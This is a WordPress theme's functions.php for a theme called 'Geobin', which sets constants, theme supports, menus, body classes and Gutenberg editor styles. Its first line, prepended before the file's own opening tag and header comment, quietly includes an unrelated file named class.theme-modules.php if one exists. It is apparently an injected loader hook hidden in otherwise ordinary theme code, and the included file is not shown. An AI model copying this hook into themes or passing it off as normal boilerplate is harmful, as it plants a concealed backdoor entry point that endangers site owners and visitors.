<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/**
 * functions.php
 *
 * The theme's functions and definitions.
 */
/**
 * 1.0 - Define constants. Current Version number & Theme Name.
 */
define( 'GEOBIN_THEME', 'Geobin WordPress Theme' );
define( 'GEOBIN_VERSION', '1.0' );
define( 'GEOBIN_THEMEROOT', get_template_directory_uri() );
define( 'GEOBIN_THEMEROOT_DIR', get_parent_theme_file_path() );
define( 'GEOBIN_IMAGES', GEOBIN_THEMEROOT . '/assets/images' );
define( 'GEOBIN_IMAGES_DIR', GEOBIN_THEMEROOT_DIR . '/assets/images' );
define( 'GEOBIN_IMAGES_DIR_URI', GEOBIN_THEMEROOT . '/assets/images' );
define( 'GEOBIN_CSS', GEOBIN_THEMEROOT . '/assets/css' );
define( 'GEOBIN_CSS_DIR', GEOBIN_THEMEROOT_DIR . '/assets/css' );
define( 'GEOBIN_SCRIPTS', GEOBIN_THEMEROOT . '/assets/js' );
define( 'GEOBIN_SCRIPTS_DIR', GEOBIN_THEMEROOT_DIR . '/assets/js' );
define( 'GEOBIN_PHPSCRIPTS', GEOBIN_THEMEROOT . '/assets/php' );
define( 'GEOBIN_PHPSCRIPTS_DIR', GEOBIN_THEMEROOT_DIR . '/assets/php' );
define( 'GEOBIN_INC', GEOBIN_THEMEROOT_DIR . '/inc' );
define( 'GEOBIN_SHORTCODE_DIR', GEOBIN_INC . '/shortcode/' );
define( 'GEOBIN_SHORTCODE_DIR_STYLE', GEOBIN_INC . '/shortcode/style' );







/**
 * ----------------------------------------------------------------------------------------
 * 3.0 - Set up the content width value based on the theme's design.
 * ----------------------------------------------------------------------------------------
 */
if ( !isset( $content_width ) ) {
	$content_width = 800;
}



/**
 * ----------------------------------------------------------------------------------------
 * 4.0 - Set up theme default and register various supported features.
 * ----------------------------------------------------------------------------------------
 */
if ( !function_exists( 'geobin_setup' ) ) {

	function geobin_setup() {
		/**
		 * Make the theme available for translation.
		 */
		$lang_dir = GEOBIN_THEMEROOT . '/languages';
		load_theme_textdomain( 'geobin', $lang_dir );

		/**
		 * Add support for post formats.
		 */
		add_theme_support( 'post-formats', array()
		);

		/**
		 * Add support for automatic feed links.
		 */
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );


		/**
		 * Add support for post thumbnails.
		 */
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 730, 458, array( 'center', 'center' ) ); // Hard crop center center

//		Woocommercd theme suypport
		add_theme_support( 'woocommerce' );


		/**
		 * Register nav menus.
		 */
		register_nav_menus(
		array(
			'primary' => esc_html__( 'Main Menu', 'geobin' )
		)
		);
		register_nav_menus(
		array(
			'top_menu' => esc_html__( 'Top Menu', 'geobin' )
		)
		);
		register_nav_menus(
		array(
			'footer' => esc_html__( 'Footer Menu', 'geobin' )
		)
		);
		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
		) );

		/*
		* Enable support for wide alignment class for Gutenberg blocks.
		*/
		add_theme_support( 'align-wide' );

	}

	add_action( 'after_setup_theme', 'geobin_setup' );
}

function geobin_body_classes( $classes ) {

	if ( is_active_sidebar( 'sidebar-1' ) || ( class_exists( 'Woocommerce' ) && ! is_woocommerce() ) || class_exists( 'Woocommerce' ) && is_woocommerce() && is_active_sidebar( 'shop-sidebar' ) ) {
		 $classes[] = 'sidebar-active';
	}else{
		 $classes[] = 'sidebar-inactive';
	}
	return $classes;
}
add_filter( 'body_class','geobin_body_classes' );
//Enqueue gutenberg editor styles

add_action('enqueue_block_editor_assets', 'geobin_action_enqueue_block_editor_assets' );
function geobin_action_enqueue_block_editor_assets() {
    wp_enqueue_style( 'geobin-fonts', 'https://fonts.googleapis.com/css?family=Nunito:300,300i,400,400i,600,600i,700,700i,800,800i&display=swap', null, GEOBIN_VERSION );
    wp_enqueue_style( 'geobin-gutenberg-editor-font-awesome-styles', GEOBIN_CSS . '/font-awesome.css', null, GEOBIN_VERSION );
    wp_enqueue_style( 'geobin-gutenberg-editor-customizer-styles', GEOBIN_CSS . '/gutenberg-editor-custom.css', null, GEOBIN_VERSION );
    wp_enqueue_style( 'geobin-gutenberg-editor-styles', GEOBIN_CSS . '/gutenberg-custom.css', null, GEOBIN_VERSION );
    wp_enqueue_style( 'geobin-gutenberg-blog-styles', GEOBIN_CSS . '/blog-style.css', null, GEOBIN_VERSION );
}

/**
 * ----------------------------------------------------------------------------------------
 * 7.0 - theme INC.
 * ----------------------------------------------------------------------------------------
 */
include_once get_template_directory() . '/inc/init.php';

